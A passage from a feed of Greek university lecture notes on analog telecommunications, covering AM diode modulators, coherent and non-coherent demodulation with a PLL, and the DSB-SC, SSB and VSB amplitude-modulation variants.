ψηφιακό, χρειάζεται να ορίσουμε μια διαδικασία (συνάρτηση) κατά την οποία,
λαμβάνοντας δείγματα θα τα αντιστοιχούμε σε αντίστοιχες καταστάσεις. Αν έχουμε
μόνο 1 bit, αυτές οι καταστάσεις θα είναι το 0 και το 1 αλλιώς, όπως εύκολα
γίνεται ξεκάθαρο, αυτές θα είναι πολλαπλάσιες.
</p>


<p>
Η λογική αυτή επεκτείνεται και για ταυτόχρονη μετάδοση περισσότερων bit και bytes.
Με την κατάλληλη διαμόρφωση πλάτους ( χρήση καταλλήλως ορισμένου αριθμού πλατών )
μπορούμε να αναθέσουμε ένα πλάτος στην κάθε κατάσταση, να αυξήσουμε, δηλαδή, τον
αριθμό των καταστάσεων που μπορούμε να μεταδόσουμε .
</p>

<p>
Αυξάνοντας το bitrate αυξάνουμε, κατ&rsquo; αυτόν τον τρόπο και την ταχύτητα:
</p>
<ul class="org-ul">
<li>Μεγαλύτερης τάξης διαμόρφωση τόσο μεγαλύτερη είναι η ταχύτητα.</li>
<li>Τάξη n-οστου βαθμού<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup> συνεπάγεται \(2^n\)</li>
<li><b>Μεγαλύτερη τάξη συνεπάγεται μεγαλύτερη πιθανότητα σφάλματος:</b> Οι καταστάσεις
είναι πιο κοντά μεταξύ τους με αποτέλεσμα καθιστώντας τον θόρυβο ολοένα και
μεγαλύτερο πρόβλημα.</li>
</ul>
</div>
</div>
<div id="outline-container-org1a0d1bb" class="outline-2">
<h2 id="org1a0d1bb"><span class="section-number-2">1.</span> <a href="#org1a0d1bb">Παρουσίαση GNU-Radio</a></h2>
<div class="outline-text-2" id="text-1">
<ul class="org-ul">
<li>έγινε μια παρουσίαση FM με την χρήση του παραπάνω πακέτου λογισμικού.</li>
<li>Συνοπτικά απλά ενδεικτικό των ραδιοφωνικών σταθμών στις διάφορες συχνότητες
και ιδιαίτερη έμφαση στην μέτρηση της ισχύος με την dbm κλιμακα</li>
</ul>
</div>
</div>
<div id="outline-container-org611728f" class="outline-2">
<h2 id="org611728f"><span class="section-number-2">2.</span> <a href="#org611728f">Διαμορφωτής AM διόδου</a></h2>
<div class="outline-text-2" id="text-2">
<div class="note" id="orgc90e04f">
<p>
Ο διαμορφωτής ( και ο πομπός ) AM, είναι ένας φθηνός και απλός διαμορφωτής.
Πλέον, όμως, έχει περιορισμένες εφαρμογές. Ακόμα η διάταξη δεν φαίνεται να
υπάρχει στο βιβλίο των Καραγιαννίδη,Παπή, επομένως θεωρώ πως είναι μικρής
σημασίας για τους διδάσκοντες.
</p>

</div>

<p>
Έχοντας δει τον τύπο της κλασσικής DSBAM-TC διαμόρφωσης (στην οποία αναφέρονται
οι σημειώσεις και ως AM απλά, αν δεν υπάρχει άλλη διευκρίνηση), θέλουμε μια
διάταξη η οποία να μπορεί, δοθέντος σήματος πληροφορίας να εξάγει σήμα της
μορφής:
</p>

\begin{equation}
\label{eq:2}
V_{out} = [A_c + m(t)]\cos{\left(2\pi f_ct\right)}
\end{equation}

<p>
Αυτό είναι επιτεύξιμό με την διάταξη του σήματος:
</p>

<div id="orge982ecb" class="figure">
<p><img src="posts/lectures/auth/tlp1/course_tlp1_images/tlp1_lec4_diamorfotis.png" alt="tlp1_lec4_diamorfotis.png">
</p>
<p><span class="figure-number">Figure 1: </span>Η απλή διάταξη ενός AM διαμορφωτή, με χρήση διόδου και αντίστασης.</p>
</div>

<p>
Αναλυτικότερα, με σήμα εισόδου \(V_{in} = A_C\cos{2\pi f_ct} + m(t)\), η παραπάνω
διάταξη θα δώσει έξοδο της μορφής:
</p>

\begin{align}
\label{eq:4}
V_{out} = \sum_{i=1}^{\infty} d_iV_{in}^{i}
\end{align}

<p>
Όπου για \(i>2\) οι τιμές των \(d_i\) είναι επαρκώς μικρές ώστε να τις θεωρήσουμε
ασήμαντες και να τις αγνοήσουμε. Έτσι προκύπτει η σχέση:
</p>

\begin{equation}
\label{eq:5}
V_{out} = 2d_2A_C\cos{2\pi f_ct}[\frac{d_1}{2d_2}+m(t)] + d_1m(t) + d_2m^2(t) + \frac{d_2A_c^2}{2}(1 + \cos{4\pi f_ct})
\end{equation}

<p>
Τοποθετόντας και ένα ζωνοπερατό φίλτρο επί της συχνότητας \(f_c\), πλάτους \(2W\),
αποκτάμε απόκριση της επιθυμητής μορφής.
</p>
</div>
</div>
<div id="outline-container-org24f25d1" class="outline-2">
<h2 id="org24f25d1"><span class="section-number-2">3.</span> <a href="#org24f25d1">Αποδιαμορφωτές AM</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Χωρίζονται σε δύο κατηγορίες, στους ασύμφωνους και τους σύμφωνους
αποδιαμορφωτές, με τους πρώτους να είναι πιο απλοί, και ιστορικά πρώτοι να
χρησιμοποιηθούν, λόγω της φθηνής διάταξης τους και της δυνατότητας τους να
λειτουργήσουν δίχως άλλη πληροφορία (πέραν του διαμορφωμένου σήματος εισόδου)
</p>
</div>
<div id="outline-container-org1b774a0" class="outline-3">
<h3 id="org1b774a0"><span class="section-number-3">3.1.</span> <a href="#org1b774a0">Ασύμφωνοι αποδιαμορφωτές</a></h3>
<div class="outline-text-3" id="text-3-1">

<div id="org24ae1d6" class="figure">
<p><img src="posts/lectures/auth/tlp1/course_tlp1_images/tlp1_lec4_asymfonosapodiamorfotis.png" alt="tlp1_lec4_asymfonosapodiamorfotis.png">
</p>
<p><span class="figure-number">Figure 2: </span>Ασύμφωνος αποδιαμορφωτής με δίοδο, μία διάταξη εμφανώς όμοια με τον διαμορφωτή με δίοδο, μόνο που στην έξοδο της έχει τοποθετηθεί παράλληλα πυκνωτής.</p>
</div>
</div>
<div id="outline-container-org0a53032" class="outline-4">
<h4 id="org0a53032"><span class="section-number-4">3.1.1.</span> <a href="#org0a53032">Λειτουργία</a></h4>
<div class="outline-text-4" id="text-3-1-1">
<p>
Κατά το τμήμα της περιόδου όπου η τάση έχει θετική τιμή, η δίοδος είναι
κατάλληλα πολωμένη, άγει και κατ&rsquo; επέκταση φορτίζεται ο πυκνωτής. Όταν όμως, η
τάση λαμβάνει αρνητικές τιμές, η τάση δεν άγει και ο πυκνωτής εκφορτίζεται με
ρυθμό \(RC=\tau\). Αυτό επαναλαμβάνεται σε κάθε περίοδο.
</p>

<p>
Αποτέλεσμα αυτού είναι η <i>οδοντωτή</i> αποτύπωση της περιβάλλουσας
</p>

<p>
Ιδανικά εδώ θέλουμε η τιμή της RC να είναι κατάλληλα ρυθμισμένη ούτως ώστε να
είναι όσο το δυνατόν πιο κοντά στην περιβάλλουσα.
</p>


<div id="org4710bfb" class="figure">
<p><img src="posts/lectures/auth/tlp1/course_tlp1_images/tlp1_lec4_asymfonosapodiamorfotis-leitourgia.png" alt="tlp1_lec4_asymfonosapodiamorfotis-leitourgia.png">
</p>
<p><span class="figure-number">Figure 3: </span>Άστοχη προσπάθεια του συγγραφέα να δείξει την προσέγγιση της περιβάλλουσας από το περιγραφόμενο κύκλωμα.</p>
</div>
</div>
</div>
<div id="outline-container-orgc858bd9" class="outline-4">
<h4 id="orgc858bd9"><span class="section-number-4">3.1.2.</span> <a href="#orgc858bd9">Υπερδιαμόρφωση</a></h4>
<div class="outline-text-4" id="text-3-1-2">
<p>
Η υπερδιαμόρφωση, όταν προκύπτει, ουσιαστικά <i>εισάγει</i> στο σήμα εξόδου μια
παραμόρφωση στην μορφή ημιτελούς περιόδου.
</p>
<ul class="org-ul">
<li>Δείκτης διαμόρφωσης.
<ul class="org-ul">
<li><a href="posts/lectures/auth/tlp1/lec_TLP1_20221003_Î´Î¹Î±Î»ÎµÎ¾Î·.html">όπως αναλύθηκε στις σημειώσεις της προηγούμενης διάλεξης</a></li>
</ul></li>
<li>Αποφυγή με VOGAD</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-org720cdfb" class="outline-3">
<h3 id="org720cdfb"><span class="section-number-3">3.2.</span> <a href="#org720cdfb">Σύμφωνοι Αποδιαμορφωτές</a></h3>
<div class="outline-text-3" id="text-3-2">

<div id="orgfddb823" class="figure">
<p><img src="posts/lectures/auth/tlp1/course_tlp1_images/tlp1_lec4_symfonosapodiamorfotis.png" alt="tlp1_lec4_symfonosapodiamorfotis.png">
</p>
<p><span class="figure-number">Figure 4: </span>Συνοπτικό διάγραμμα ασύμφωνου αποδιαμορφωτή, με την χρήση ταλαντωτή (PLL).</p>
</div>

<p>
Tο PLL, αποτελεί εξάρτημα το οποίο ρυθμίζουμε ώστε να βγάζει συνημιτονοειδή
έξοδο στην συχνότητα που θέλουμε (\(f_c\)). Αυτό το θέλουμε καθώς κατα αυτό τον
τρόπο, ο πολλαπλασιασμός των σημάτων \(x(t),c(t)\) μας δίνει σήματα εύκολα
διαχωρίσιμα με χαμηλοπερατό φίλτρο. (Αν γίνουν οι πράξεις, ή ακόμα και με το
μυαλό, είναι εμφανές πως ο πολλαπλασιασμός θα έχει έναν όρο χωρίς συνημίτονο,
και έναν όρο με συνημίτονο στην συχνότητα \(2f_c\)).
</p>


<p>
Στην συνέχεια, φιλτράρεις εκείνα με το LPF και <i>γλυτώνεις</i> από την DC συνιστώσα με
τον πυκνωτή.
</p>

<p>
Έτσι, τελικά, μπορεί να προκύψει το \(\frac{1}{2} m(t)\), το σήμα πληροφοριών που θέλουμε
</p>
</div>
<div id="outline-container-orgf2b802d" class="outline-4">
<h4 id="orgf2b802d"><span class="section-number-4">3.2.1.</span> <a href="#orgf2b802d">Υποβάθμιση σήματος.</a></h4>
<div class="outline-text-4" id="text-3-2-1">
<p>
Παρόλα αυτά, υπο συνθήκες το PLL δεν <i>κλειδώνει</i>. Σε εκείνες τις περιπτώσεις, λόγω
της μικρής διαφοράς φάσης σε είσοδο και \(c(t)\) (<i>έξοδο του PLL</i>) η τελική έξοδος
του αποδιαμορφωτή ισούται με:
</p>

\begin{equation}
\label{eq:1}
\frac{1}{2}[A_c+m(t)]\cos{\phi}
\end{equation}
<p>
όπου \(\phi\) η <i>αστοχία φάσης</i>
</p>

<div class="note" id="org81a93aa">
<p>
Ανάλυση των σύμφωνων αποδιαμορφωτών, σε μεγαλύτερο βάθος, γίνεται και στην
επόμενη διάλεξη: <a href="posts/lectures/auth/tlp1/lec_TLP1_20221011.html">Διάλεξη 4</a>
</p>

</div>
</div>
</div>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Εδώ είχα σημείωση για σύνδεση με την τάξη διαμόρφωσης πλάτους, για την
οποία δεν έχω άλλη αναφορά στις σημειώσεις μου.
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>Διάλεξη 4: Ολοκλήρωση AM: Εναλλακτικές AM διαμορφώσεις.</title>
<link>posts/lectures/auth/tlp1/lec_TLP1_20221011.html</link>
<pubDate>Tue, 11 Oct 2022 00:00:00 +0300</pubDate>
<guid>posts/lectures/auth/tlp1/lec_TLP1_20221011.html</guid>
<description>
<![CDATA[<p>
<b>Αποδιαμόρφωση:</b> η διαδικασία με την οποία από το ληφθέν σήμα \(x(t)\) μπορούμε να
<i>πάρουμε</i> το αρχικό σήμα ( σήμα πληροφορίας ) \(m(t)\)
</p>
<div id="outline-container-org12ae3d9" class="outline-2">
<h2 id="org12ae3d9"><span class="section-number-2">1.</span> <a href="#org12ae3d9">Σύμφωνοι Αποδιαμορφωτές ΑΜ</a></h2>
<div class="outline-text-2" id="text-1">

<div id="orge4a897e" class="figure">
<p><img src="posts/lectures/auth/tlp1/course_tlp1_images/tlp1_lec4_symfonosapodiamorfotis.png" alt="tlp1_lec4_symfonosapodiamorfotis.png">
</p>
</div>

<p>
Συνεχίζοντας από το τέλος της <a href="posts/lectures/auth/tlp1/lec_TLP1_20221010_διαλεξη.html">προηγούμενης διάλεξης</a> εδώ αναλύονται καλύτερα οι
σύμφωνοι αποδιαμορφωτές.
</p>

<p>
<i>Coherent demodulators</i> (σύμφωνους αποδιαμορφωτές) ονομάζουμε εκείνους που έχουν
<i>κάποια</i> γνώση τον στοιχείων του πομπού για να αποδιαμορφώσουν το σήμα εισόδου.
Συγκεκριμένα, πρέπει να γνωρίζουν την <b>συχνότητα και την φάση</b>. Λόγω, όμως, της
σχέσης που συνδέει τα δύο αυτά μεγέθη και τα δύο βρίσκονται από το PLL 
</p>

<div class="note" id="org839f4af">
<p>
Πρακτικά βρίσκει πρώτα την φάση και μετά την συχνότητα.
</p>

</div>
</div>
<div id="outline-container-org6fbc6d6" class="outline-3">
<h3 id="org6fbc6d6"><span class="section-number-3">1.1.</span> <a href="#org6fbc6d6">Αναλογικό PLL</a></h3>
<div class="outline-text-3" id="text-1-1">
<p>
<b>Συνοπτικά</b>: Το PLL αποτελεί σύστημα ελέγχου που επιτρέπει σε ταλαντωτή να
ταυτιστεί/ μιμηθεί έναν άλλον.
</p>


<div id="orgeb8a6f1" class="figure">
<p><img src="posts/lectures/auth/tlp1/course_tlp1_images/tlp1_lec4_pll.png" alt="tlp1_lec4_pll.png">
</p>
<p><span class="figure-number">Figure 1: </span>Απλό μοντέλο (εσωτερικό) του PLL, για κατανόηση του τρόπου λειτουργίας.</p>
</div>


<p>
Λίγο αναλυτικότερα, για σήμα εισόδου της μορφής:
</p>
\begin{equation}
\label{eq:8}
r(t) = A_r\cos{2\pi f_ct + \theta(t)}\\
\end{equation}
<p>
κλασσικό δηλαδή σήμα διαμορφωτή ΑΜ, το PLL βγάζει σήμα της μορφής:
</p>
\begin{equation}
\label{eq:4}
v(t) = A_y\cos{\left(2\pi f_ct + \phi(t)\right)}
\end{equation}
<p>
όπου, οταν το PLL <i>συμπίπτει</i> ισχύει: 
</p>
\begin{equation}
\label{eq:9}
\phi(t) - \theta(t) = 0
\end{equation}

<ul class="org-ul">
<li>Το PLL είναι αναγκαίο σε τηλεπικοινωνιακά συστήματα, καθώς είναι κριτικής
σημασίας ο συγχρονισμός πομπού δέκτη.</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-org0ee9c6f" class="outline-2">
<h2 id="org0ee9c6f"><span class="section-number-2">2.</span> <a href="#org0ee9c6f">Άλλες μορφές διαμορφώσεων πλάτους</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Στην <a href="posts/lectures/auth/tlp1/lec_TLP1_20221012.html#orgebe855f">δεύτερη διάλεξη</a> είδαμε συνοπτικά πως υπάρχουν 4 είδη ΑΜ διαμόρφωσης. Μέχρι
στιγμής έχει εξεταστεί το βασικότερο: <b>Double Sided Band-AM Total Carrier</b>, όμως
σε αυτή την διάλεξη, ολοκληρώνοντας το θεωρητικό κομμάτι της διαμόρφωσης
πλάτους θα αναφερθούμε και στα υπόλοιπα
</p>
<ul class="org-ul">
<li><a href="#org9c49920">DSB-AM-SC</a></li>
<li><a href="#orgb1b0619">SSB-AM</a></li>
<li><a href="#org04767df">VSB-AM</a></li>
</ul>
</div>
<div id="outline-container-org9c49920" class="outline-3">
<h3 id="org9c49920"><span class="section-number-3">2.1.</span> <a href="#org9c49920">DSB-AM-SC: Διπλής Πλευρικής Ζώνης με Καταργημένο Φέρον.</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
Τα αρχικά της διαμόρφωσης, σε πλήρη αναλογία με την ελληνική ονομασία σημαίνουν:
<b>Double Sided Band-AM-Suppressed Carrier</b>
</p>


<div id="org750dc73" class="figure">
<p><img src="posts/lectures/auth/tlp1/course_tlp1_images/tlp1_lec4_dsamtc-dsamsc-differences.png" alt="tlp1_lec4_dsamtc-dsamsc-differences.png">
</p>
<p><span class="figure-number">Figure 2: </span>Σύγκριση απλού, συνημιτονοειδούς σήματος πληροφορίας, με τις αντοίστιχες διαμορφώσεις πλάτους TC, SC.</p>
</div>


<p>
Ενώ στην DSB-AM-TC το διαμορφωμένο σήμα έχει την μορφή:
</p>
\begin{equation}
\label{eq:1}
x(t) = [A_C + m(t)]\cos{2\pi f_ct}
\end{equation}
<p>
Εδώ έχουμε:
</p>
\begin{equation}
\label{eq:2}
x(t) = A_Cm(t)\cos{2\pi f_ct}
\end{equation}
<p>
με αυτή την μορφή να έχει αρκετά προτερήματα επί της κλασσικής διαμόρφωσης
πλάτους, με κυριότερο εξ εκείνων, την ευκολότερη ρύθμιση της ισχύος του
διαμορφωμένου σήματος και την αποδοτικότητα του.
</p>
</div>
<div id="outline-container-org92ecdac" class="outline-4">
<h4 id="org92ecdac"><span class="section-number-4">2.1.1.</span> <a href="#org92ecdac">Σύγκριση με DSBAMTC</a></h4>
<div class="outline-text-4" id="text-2-1-1">
<p>
<i>Στην DSBAMTC</i> το φέρον προστίθεται για να μπορούμε να κάνουμε ασύμφωνη
αποδιαμόρφωση, χαρακτηριστική της TC, καθώς δεν είναι υλοποιήσιμη στην SC. Αυτό
ήταν αρχικά σημαντικό λόγω του υψηλού κόστους κατασκευής των κυκλωμάτων για το
PLL, που καθιστούσε την σύμφωνη αποδιαμόρφωση εξαιρετικά ακριβή και άρα
απαγορευμένη. Με τα χρόνια, όμως, αυτό το κόστος έχει ελαχιστοποιηθεί,
επιτρέποντάς μας να περάσουμε από την ασύμφωνη στην σύμφωνη αποδιαμόρφωση.
</p>


<div id="orgba31323" class="figure">
<p><img src="posts/lectures/auth/tlp1/course_tlp1_images/tlp1_lec4_dsamtc-dsamsc-differences-split.png" alt="tlp1_lec4_dsamtc-dsamsc-differences-split.png">
</p>
<p><span class="figure-number">Figure 3: </span>Σύγκριση των δυο διαμορφώσεων, σε ξεχωριστά διαγράμματα.</p>
</div>

<ul class="org-ul">
<li><b>Διαφορά στο πεδίο του χρόνου</b>
Η γραφική παράσταση του \(x(t)\) αλλάζει σημαντικά μεταξύ των μορφών συνολικού
και κατηργημένου φέροντος, όπως άλλωστε φαίνεται και από τα διαγράμματα. Το
πλάτος του διαμορφωμένου κατά TC σήματος φαίνεται ουσιαστικά να μην διαχωρίζει
ελάχιστο από μέγιστο, ενώ αντίθετα, στο SC το πλάτος των επιμέρους
ταλαντώσεων, είναι ανάλογο του \(m(t)\), με αποτέλεσμα να είναι εμφανής ο
<i>συγχρονισμός</i> του διαμορφωμένου σήματος και του σήματος πληροφορίας.</li>
</ul>
</div>
</div>
<div id="outline-container-org181f873" class="outline-4">
<h4 id="org181f873"><span class="section-number-4">2.1.2.</span> <a href="#org181f873">Διαφορά στο πεδίο της συχνότητας</a></h4>
<div class="outline-text-4" id="text-2-1-2">
<p>
Όπως φαίνεται και από τις παρακάτω εξισώσεις, το φασματικό περιεχόμενο της SC
παρουσιάζει πολλές ομοιότητες με εκείνο της TC<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>, λείπουν, όμως, οι ώσεις που
οφείλονται στην DC συνιστώσα. Έχουμε ουσιαστικά μόνο μετατοπίσεις του φάσματος
του μηνύματος, ενισχυμένες (καθώς πολλαπλασιάζεται με \(A_c\)). Αυτό είναι εμφανές
από τις παρακάτω εξισώσεις:
</p>

\begin{align}
\label{eq:10}
X(f) &= \frac{1}{2}A_c[\delta(f-f_c)+\delta(f+f_c)] + \frac{1}{2}[M(f-f_c)+M(f+f_c)] &\text{DSBAMTC}\\
X(f) &= \frac{1}{2}A_c[M(f-f_c)+M(f+{f_c})]&\text{DSBAMSC}
\end{align}
</div>
</div>
<div id="outline-container-org1f50daa" class="outline-4">
<h4 id="org1f50daa"><span class="section-number-4">2.1.3.</span> <a href="#org1f50daa">Ισχύς</a></h4>
<div class="outline-text-4" id="text-2-1-3">
<p>
Ακόμα, ένας παράγοντας που όσο περνάνε τα χρόνια αποκτά αυξανόμενη σημασία
είναι το ενεργειακό κόστος το οποίο, όπως μπορούμε να δούμε, είναι πιο εύκολα
χειριζόμενο στην περίπτωση της DSBAMSC διαμόρφωσης
</p>

\begin{equation}
\label{eq:14}
P_{DSBAMSC} = 
\frac{1}{2}A_c^2P_{m}
\end{equation}


<p>
Από όπου φαίνεται, ακόμα πως η ισχύς του φέροντος δεν αναλώνεται σε συνιστώσα
άσχετη με εκείνη του σήματος πληροφορίας, όπως δείχνει η:
</p>
\begin{equation}
\label{eq:15}
P_{DSBAMTC} = \frac{1}{2}A_c^2 + \frac{1}{2}P_{m}
\end{equation}
</div>
</div>
<div id="outline-container-org7b03edf" class="outline-4">
<h4 id="org7b03edf"><span class="section-number-4">2.1.4.</span> <a href="#org7b03edf">(Σύμφωνη) Αποδιαμόρφωση</a></h4>
<div class="outline-text-4" id="text-2-1-4">

<div id="orgc27c9a8" class="figure">
<p><img src="posts/lectures/auth/tlp1/course_tlp1_images/tlp1_lec4_dsbamsc-apodiamorfotis.png" alt="tlp1_lec4_dsbamsc-apodiamorfotis.png">
</p>
<p><span class="figure-number">Figure 4: </span>Απλός SC αποδιαμορφωτής, με την χρήση PLL</p>
</div>

<p>
Στις παρακάτω εξισωεις, δείχνουμε την διαδικασία της αποδιαμόρφωσης μέσα από τον
παραπάνω σύμφωνο αποδιαμορφωτή, <span class="underline">όταν, όμως, δεν έχουμε πλήρη ταύτιση της φάσης
του PLL και του σήματος εισόδου</span>.
</p>

\begin{align}
\label{eq:13}
x(t) &= A_cm(t)\cos{\left(2\pi f_ct + \phi_c\right)}\\
\stackrel{*\cos{\left(2\pi f_ct+ \phi\right)}}{\Rightarrow} x'(t) &= A_cm(t)\cos{\left(2\pi f_ct + \phi\right)}\cos{\left(2\pi f_ct + \phi_c\right)}\\
 x'(t) &= \frac{1}{2}A_cm(t)[\cos{\left(\phi_c - \phi\right)} + \cos{\left(4\pi f_ct + \phi + \phi_c\right)}]\\
\stackrel{LPF}{\Rightarrow} y(t) &= \frac{1}{2}A_cm(t)\cos{\left(\phi_c-\phi\right)}
\end{align}

<p>
Στην περίπτωση όπου \(\phi_c = \phi\), οπότε \(\cos{\left(\phi_c-\phi\right)}=1\),
προφανώς έχουμε:
</p>
\begin{equation}
\label{eq:3}
y(t) = 1/2 A_cm(t)
\end{equation}
</div>
</div>
</div>
<div id="outline-container-orgb1b0619" class="outline-3">
<h3 id="orgb1b0619"><span class="section-number-3">2.2.</span> <a href="#orgb1b0619">SSB-AM: Single Sideband AM</a></h3>
<div class="outline-text-3" id="text-2-2">
<div class="note" id="org2348417">
<p>
Τόσο το SSB-AM, όσο και το VSB-AM αποτελούν πλέον παρωχημένες τεχνολογίες.
Αναφέρθηκαν μόνο για σφαιρική γνώση και τονίστηκε πως δεν χρειάζεται εμβάθυνση
σε αυτές τις δύο. Πιο συγκεκριμένα η VSB-AM, βελτίωση της SSB-AM,
χρησιμοποιούνταν σε κάποια φάση στις τηλεοράσεις πριν μεταβούμε στο ψηφιακό σήμα
τηλεόρασης.  
</p>

</div>

<p>
Στις περιπτώσεις που εξετάστηκαν μέχρι στιγμής στέλναμε ουσιαστικά το ίδιο σήμα
(του οποίου το περιεχόμενο χωρίζεται όπως είδαμε σε προηγούμενη διάλεξη σε άνω
και κάτω πλευρικές ζώνες) σε δύο διαφορετικές συχνότητες: \(\pm f_c\).
</p>


<div id="org53e9ec9" class="figure">
<p><img src="posts/lectures/auth/tlp1/course_tlp1_images/tlp1_lec4_ssb-am-deixnontas-dipli-pliroforia.png" alt="tlp1_lec4_ssb-am-deixnontas-dipli-pliroforia.png">
</p>
<p><span class="figure-number">Figure 5: </span>Ανάδειξη της κάτω και άνω πλευρικής ζώνης κατά την DSBAMSC διαμόρφωση.</p>
</div>


<p>
Αντί να στέλνει, κανείς, και τις δύο πλευρικές ζώνες, γίνεται να μεταφέρει την
ίδια πληροφορία, εξοικονομώντας εύρος ζώνης (από 2W σε W) και ισχύ στέλνοντας
μόνο μια εκ των δύο. Ανάλογα με το ποια από τις δύο ζώνες εν τέλη στέλνεται λέμε
ότι έχουμε και την αντίστοιχη <i>μορφή</i> SSB-AM:
</p>
<ul class="org-ul">
<li>USSB <i>(Upper - SSB)</i></li>
<li>LSSB <i>(Lower - SSB)</i></li>
</ul>
</div>
<div id="outline-container-org6689133" class="outline-4">
<h4 id="org6689133"><span class="section-number-4">2.2.1.</span> <a href="#org6689133">Μειονεκτήματα:</a></h4>
<div class="outline-text-4" id="text-2-2-1">
<p>
<b>Παρόλο που γλυτώνουν εύρος ζώνης δεν χρησιμοποιούνται λόγω θορύβου:</b>
</p>
<ul class="org-ul">
<li>Χρειάζεται φίλτρα μεγάλης ακριβείας, καθώς αν το \(M(f)\) έχει ισχύ κοντά στο
\(0\) (και συνεπώς κατά την μετατόπιση και στο \(+f_c, -f_c\)), τότε είναι
εξαιρετικά πιθανό τα φίλτρα είτε να κόβουν πληροφορία από την επιλεγμένη
προς <i>προώθηση</i> πλευρική ζώνη, είτε να αφήνουν να περάσει και μέρος της ζώνης
που θέλαμε να κόψουμε, <b>παραμορφώνοντας το τελικό μας σήμα.</b><sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup></li>
<li>Καθώς η ισχύς του αποστελλόμενου σήματος είναι χαμηλότερη από ότι στην
κλασσική αντίστοιχη διαμόρφωση (το SSB λειτουργεί κυρίως επί SC
διαμόρφωσης), το SNR είναι μικρότερο, που δείχνει οτι <b>είναι πιο ευάλωτη
διαμόρφωση στον θόρυβο</b></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-org04767df" class="outline-3">
<h3 id="org04767df"><span class="section-number-3">2.3.</span> <a href="#org04767df">VSB-AM: Vestigial Side Band AM</a></h3>
<div class="outline-text-3" id="text-2-3">
<div class="note" id="orgff6d22d">
<p>
Στις εξετάσεις μπορεί να βρίσκεται μόνο σε ερωτήσεις ΣΛ με σύντομη αιτιολόγηση.
</p>

</div>

<ul class="org-ul">
<li>Ουσιαστικά βελτίωση του SSB AM γιατί αίρει τον περιορισμό περί <b>ακρίβειας</b> των
εμπλεκόμενων φίλτρων.</li>
<li>Χρησιμοποιούνταν παλαιότερα στην αναλογική τηλεόραση</li>
<li>Πλέον έχει χάσει το ενδιαφέρον του.</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-org679550f" class="outline-2">
<h2 id="org679550f"><span class="section-number-2">3.</span> <a href="#org679550f">Σύνοψη διαμορφώσεων πλάτους.</a></h2>
<div class="outline-text-2" id="text-3">
<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<tbody>
<tr>
<td class="org-left">Χαρακτηριστικό Διαμόρφωσης - Διαμόρφωση</td>
<td class="org-left">DSBAMTC</td>
<td class="org-left">DSBAMSC</td>
<td class="org-left">SSBAM</td>
<td class="org-left">VSBAM</td>
</tr>

<tr>
<td class="org-left">\(x_i\)</td>
<td class="org-left">\(A_c+m(t)\)</td>
<td class="org-left">\(A_{c} m(t)\)</td>
<td class="org-left">\(A_{c} m(t)\)</td>
<td class="org-left">\(A_{c} m(t)\)</td>
</tr>

<tr>
<td class="org-left">Εύρος Ζώνης</td>
<td class="org-left">\(2W\)</td>
<td class="org-left">\(2W\)</td>
<td class="org-left">\(W\)</td>
<td class="org-left">\(W + \frac{W}{K}\)</td>
</tr>

<tr>
<td class="org-left">Αποδιαμόρφωση</td>
<td class="org-left">Ασύμφωνη</td>
<td class="org-left">Σύμφωνη</td>
<td class="org-left">Σύμφωνη</td>
<td class="org-left">Σύμφωνη</td>
</tr>

<tr>
<td class="org-left">Ισχύς</td>
<td class="org-left">\(\frac{A_c^2}{2} + \frac{1}{2}mathcal{P}_m\)</td>
<td class="org-left">\(\frac{A_c^2}{2} \mathcal{P}_m\)</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">Πολυπλοκότητα δέκτη</td>
<td class="org-left">μικρή</td>
<td class="org-left">μεγάλη</td>
<td class="org-left">μεγάλη</td>
<td class="org-left">μεγάλη</td>
</tr>

<tr>
<td class="org-left">Κόστος δέκτη</td>
<td class="org-left">χαμηλό</td>
<td class="org-left">υψηλό</td>
<td class="org-left">υψηλό</td>
<td class="org-left">υψηλό</td>
</tr>

<tr>
<td class="org-left">Αποδοτικότητα ισχύος</td>
<td class="org-left">μικρή</td>
<td class="org-left">μέγιστη</td>
<td class="org-left">μέγιστη</td>
<td class="org-left">μέγιστη</td>
</tr>
</tbody>
</table>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Το <a href="posts/lectures/auth/tlp1/lec_TLP1_20221012.html">φασματικό περιεχόμενο της DSBAMTC που εξετάστηκε στην δεύτερη διάλεξη</a>
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Στην πραγματικότητα είναι δύσκολο να γίνει κατανοητό με τον τρόπο της
<i>ισχύος</i> στο 0. Είναι πιο εύκολο να γίνει κατανοητό γραφικά. Τα ζωνοπερατά φίλτρα,
αν και ιδανικά θα λειτουργούσαν ακριβώς στο \((f_c,f_c + W)\) (ή σε οποιαδήποτε
περιοχή έπρεπε να λειτουργήσουν), δεν λειτουργούν έτσι. Η ακρίβεια τους είναι
περιορισμένη. Λόγω αυτού, μπορεί μέρος της κάτω πλευρικής ζώνης (ή της άνω),
ανάλογα με την μορφή της SSB διαμόρφωσης που κάνουμε, να περάσει παραμορφώνοντας
την έξοδο μας.
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>Διάλεξη 2: ΑΜ: Σημειώσεις επί των διαφανειών.</title>
<link>posts/lectures/auth/tlp1/lec_TLP1_20221012.html</link>
